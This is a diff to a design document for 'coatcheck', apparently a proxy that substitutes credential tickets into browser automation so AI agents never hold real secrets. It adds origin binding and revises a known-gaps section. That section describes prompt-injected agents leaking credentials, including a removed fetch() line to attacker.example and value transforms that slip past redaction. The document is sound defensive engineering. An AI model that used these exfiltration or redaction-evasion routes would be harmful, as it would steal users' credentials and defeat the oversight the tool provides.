@@ -156,29 +156,44 @@ There is no authentication on the WebSocket upgrade beyond knowledge of the
 sid. The sid is unguessable and only delivered to the agent in the rewritten
 response, and the listener binds to loopback by default.
 
+### Origin tracking
+
+`OriginTracker` (`packages/core/src/cdp/origin-tracker.ts`), one per
+connection, keeps each flattened CDP session's committed main-frame URL from
+inbound `Page.frameNavigated` events with no `parentId`. The origin is
+**unknown** before the first such event, for non-http(s) URLs (`about:blank`,
+`data:`, `chrome-error:`), and while a main-frame navigation is in progress:
+from an outbound `Page.navigate` / `Page.reload` / `Page.navigateToHistoryEntry`
+or an inbound main-frame `Page.frameStartedLoading`, until the next main-frame
+`Page.frameNavigated` or `Page.frameStoppedLoading` (or a `Page.navigate`
+response that commits nothing). Sessions are forgotten on
+`Target.detachedFromTarget`.
+
 ### Outbound substitution (agent → browser)
 
-`substituteOutbound` (`packages/core/src/cdp/substitution.ts:33-95`):
+`substituteOutbound` (`packages/core/src/cdp/substitution.ts`):
 
 - Pre-filter: if the raw frame contains no `cct_` substring, forward it
-  untouched without parsing (`:39`). Most CDP traffic skips JSON parsing.
-- Otherwise parse and substitute only in these fields:
-
-| CDP method               | Fields                                        | Typical Playwright call          |
-|--------------------------|-----------------------------------------------|----------------------------------|
-| `Input.insertText`       | `params.text`                                 | `page.fill(sel, ticket)`         |
-| `Runtime.evaluate`       | `params.expression`                           | string-form `page.evaluate(...)` |
-| `Runtime.callFunctionOn` | `params.functionDeclaration`, `params.arguments[*].value` | `page.evaluate(fn, ticket)` |
-
-Playwright pads `Runtime.callFunctionOn.arguments` with internal entries
-before user arguments (a probe saw the ticket at index 5), so the code walks
-the whole array (`:62-69`).
-
+  untouched without parsing. Most CDP traffic skips JSON parsing.
+- Only `Input.insertText.params.text` (what `page.fill()` sends) is a
+  substitution site. `TokenStore.replaceAllForSession(text, sid, origin)`
+  swaps a session ticket only when the frame's CDP session has a known origin
+  that matches the ticket's allowed hosts (an `http:` page needs an `http://`
+  entry; unbound tickets match any known origin). If any ticket in the frame
+  is denied, the whole frame is dropped and the client gets a CDP error with
+  the request's `id` and `sessionId`: `credential-origin violation: <secret>
+  not allowed on <scheme>://<host>`, or `… page origin unknown (<reason>) …`.
+  Playwright retries the action on such errors until its timeout.
+- `Runtime.evaluate` and `Runtime.callFunctionOn` are not substitution sites:
+  an expression that received the real value could send it anywhere.
+  Playwright's `fill` passes the ticket to its injected script through
+  `callFunctionOn.arguments`, but for text, email and password inputs that
+  script only focuses and selects the field; the value is typed with
+  `Input.insertText` (verified by `packages/core/src/cdp/e2e.test.ts`).
 - A frame of any other method that contains `cct_` is forwarded unmodified and
-  logged as "token observed in unsupported method" (`:87-88`,
-  `packages/core/src/cdp/proxy.ts:123-127`). Deliberately not substituted in v1:
-  `Network.setExtraHTTPHeaders`, `Page.addScriptToEvaluateOnNewDocument`,
-  `Fetch.continueRequest`.
+  logged ("token observed in …"; at info level for `Runtime.*`, which is
+  expected). Not substituted: `Network.setExtraHTTPHeaders`,
+  `Page.addScriptToEvaluateOnNewDocument`, `Fetch.continueRequest`.
 - Binary frames are forwarded without inspection (`packages/core/src/cdp/proxy.ts:96-99`).
 
 ### Inbound redaction (browser → agent)
@@ -263,25 +278,30 @@ session remains the client's job.
 | Ticket expired before use | Literal `cct_…` reaches the page; login fails visibly. |
 | `page.type()` with a ticket | Last keystroke frame dropped, CDP error returned. |
 | Real value echoed in an inbound frame that cannot be cleaned | Frame dropped; the awaiting client call stalls. |
-| Ticket in an unsupported CDP method | Forwarded unsubstituted, warning logged. |
+| Ticket in an unsupported CDP method | Forwarded unsubstituted, logged. |
+| `Input.insertText` with a ticket on a disallowed or unknown origin | Frame dropped, CDP error (`credential-origin violation`) with the request's `id` and `sessionId`; Playwright retries until its action timeout. |
 | CDP listener bind failure | Process exits. |
 
 ## Known gaps
 
-- **No origin binding.** Session-bound tickets substitute on any
-  `Input.insertText` / `Runtime.*` frame regardless of the page loaded. A
-  prompt-injected agent that navigates to `https://attacker.example` and fills
-  the ticket there sends the real credential to that page. Closing this means
-  tracking each target's current origin (`Page.frameNavigated`) and
-  substituting only on an allowed-origin match, with real edge cases (auth
-  subdomains, OAuth/SSO redirects). Today the only guardrails are
-  session-scoping and TTL.
-- **`Runtime.evaluate` can exfiltrate directly.** Because `expression` and
-  `functionDeclaration` are substitution sites, an agent can send
-  `fetch('https://attacker.example/?p=' + 'cct_…')` and coatcheck will put the
-  real value into the expression that runs in the page. The same lack of host
-  binding as above; there is no restriction on what the substituted script
-  does.
+- **Script on an allowed origin can read the filled value.** Origin binding
+  (roadmap item 15) stops a fill on another site and closes direct
+  exfiltration through `Runtime.*` expressions, but once the real value is in
+  a field on an allowed origin, script the agent runs there
+  (`page.evaluate`) can read it and send it anywhere, transformed so the
+  redactor doesn't match. A navigation that page script starts can also race
+  a fill (the start event may not have reached coatcheck yet).
+- **Cross-origin iframe logins.** The binding keys on the main frame, because
+  the focused frame can't be attributed from `Input.insertText`:
+  - a login form inside an iframe from another origin (for example an
+    embedded auth widget) is refused unless the main frame's origin is
+    allowed;
+  - on an allowed main frame, a fill whose focus is inside a cross-origin
+    iframe (including one the agent injected) types the real value into that
+    iframe.
+- **SSO and auth subdomains** need their hosts in the login secret's allowed
+  hosts (`*.example.com` or explicit entries); the page origin at fill time is
+  what is checked.
 - **The redactor only matches the literal value.** Any transform defeats
   inbound redaction: `btoa(el.value)`, `el.value.split('').reverse().join('')`,
   `encodeURIComponent`, char codes, slicing into pieces across frames. An agent
